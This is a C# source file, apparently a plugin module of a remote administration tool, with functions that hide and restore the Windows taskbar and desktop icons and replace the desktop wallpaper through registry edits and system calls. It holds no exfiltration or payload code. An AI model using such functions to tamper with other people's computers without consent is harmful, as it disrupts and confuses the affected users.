using Microsoft.Win32;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using static Plugin.Imports;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class UI
    {
        internal static void HideTaskBar()
        {
            ShowWindow(FindWindow("Shell_TrayWnd", null), SW_HIDE);
        }

        internal static void ShowTaskBar()
        {
            ShowWindow(FindWindow("Shell_TrayWnd", null), SW_NORMAL);
        }

        internal static void SetWallpaper(byte[] file, string ext)
        {
            string path1 = Path.Combine(Path.GetTempFileName() + ext);
            string path2 = Path.Combine(Path.GetTempFileName() + ext);
            File.WriteAllBytes(path1, file);

            using (Bitmap bmp = new Bitmap(path1))
            using (Graphics graphics = Graphics.FromImage(bmp))
            {
                bmp.Save(path2, ImageFormat.Bmp);
            }
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true))
            {
                key.SetValue("WallpaperStyle", 2.ToString());
                key.SetValue("TileWallpaper", 0.ToString());
            }
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path2, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }

        internal static void HideDesktopIcons()
        {
            IntPtr progManager = FindWindow("Progman", null);
            //If (progManager) ??
            IntPtr desktop = FindWindowEx(progManager, IntPtr.Zero, "SHELLDLL_DefView", null);
            //If (desktop) ??
            IntPtr handle = FindWindowEx(desktop, IntPtr.Zero, "SysListView32", null);
            ShowWindow(handle, SW_HIDE);
        }

        internal static void ShowDesktopIcons()
        {
            IntPtr progManager = FindWindow("Progman", null);
            //If (progManager) ??
            IntPtr desktop = FindWindowEx(progManager, IntPtr.Zero, "SHELLDLL_DefView", null);
            //If (desktop) ??
            IntPtr handle = FindWindowEx(desktop, IntPtr.Zero, "SysListView32", null);
            ShowWindow(handle, SW_SHOW);
        }
    }
}
